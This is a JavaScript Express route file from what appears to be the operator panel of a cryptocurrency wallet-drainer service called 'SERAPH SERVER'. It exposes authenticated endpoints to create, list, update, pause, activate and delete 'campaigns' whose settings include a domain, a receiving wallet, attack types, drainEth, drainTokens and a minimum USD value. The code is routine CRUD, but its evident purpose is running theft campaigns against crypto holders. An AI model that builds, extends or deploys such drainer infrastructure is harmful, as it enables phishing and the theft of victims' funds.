/**
 * ============================================================================
 * SERAPH SERVER - Campaign Routes (Operator)
 * ============================================================================
 */

import { Router } from 'express'
import { requireOperator } from '../middleware/auth.js'
import campaignService from '../services/campaign.service.js'
import { success, created, badRequest, notFound, paginated } from '../utils/response.js'

const router = Router()

// All routes require operator auth
router.use(requireOperator)

/**
 * GET /campaigns
 * List operator's campaigns
 */
router.get('/', async (req, res) => {
  try {
    const { page = 1, limit = 20, status, search } = req.query
    
    const result = await campaignService.getCampaigns(req.user.id, {
      page: parseInt(page),
      limit: parseInt(limit),
      status,
      search
    })
    
    return paginated(res, result.campaigns, {
      page: result.page,
      limit: result.limit,
      total: result.total
    })
  } catch (err) {
    return badRequest(res, err.message)
  }
})

/**
 * POST /campaigns
 * Create a new campaign
 */
router.post('/', async (req, res) => {
  try {
    const {
      name,
      description,
      domain,
      walletId,
      attackTypes,
      drainEth,
      drainTokens,
      minValueUsd
    } = req.body
    
    if (!name) {
      return badRequest(res, 'Campaign name is required')
    }
    
    const campaign = await campaignService.createCampaign(req.user.id, {
      name,
      description,
      domain,
      walletId,
      attackTypes,
      drainEth,
      drainTokens,
      minValueUsd
    })
    
    return created(res, campaign, 'Campaign created')
  } catch (err) {
    return badRequest(res, err.message)
  }
})

/**
 * GET /campaigns/:id
 * Get campaign details
 */
router.get('/:id', async (req, res) => {
  try {
    const campaign = await campaignService.getCampaignById(req.params.id, req.user.id)
    return success(res, campaign)
  } catch (err) {
    return notFound(res, err.message)
  }
})

/**
 * PUT /campaigns/:id
 * Update campaign
 */
router.put('/:id', async (req, res) => {
  try {
    const campaign = await campaignService.updateCampaign(
      req.params.id,
      req.user.id,
      req.body
    )
    return success(res, campaign, 'Campaign updated')
  } catch (err) {
    return badRequest(res, err.message)
  }
})

/**
 * DELETE /campaigns/:id
 * Delete campaign
 */
router.delete('/:id', async (req, res) => {
  try {
    await campaignService.deleteCampaign(req.params.id, req.user.id)
    return success(res, null, 'Campaign deleted')
  } catch (err) {
    return badRequest(res, err.message)
  }
})

/**
 * POST /campaigns/:id/pause
 * Pause campaign
 */
router.post('/:id/pause', async (req, res) => {
  try {
    const campaign = await campaignService.updateCampaign(
      req.params.id,
      req.user.id,
      { status: 'paused' }
    )
    return success(res, campaign, 'Campaign paused')
  } catch (err) {
    return badRequest(res, err.message)
  }
})

/**
 * POST /campaigns/:id/activate
 * Activate campaign
 */
router.post('/:id/activate', async (req, res) => {
  try {
    const campaign = await campaignService.updateCampaign(
      req.params.id,
      req.user.id,
      { status: 'active' }
    )
    return success(res, campaign, 'Campaign activated')
  } catch (err) {
    return badRequest(res, err.message)
  }
})

export default router
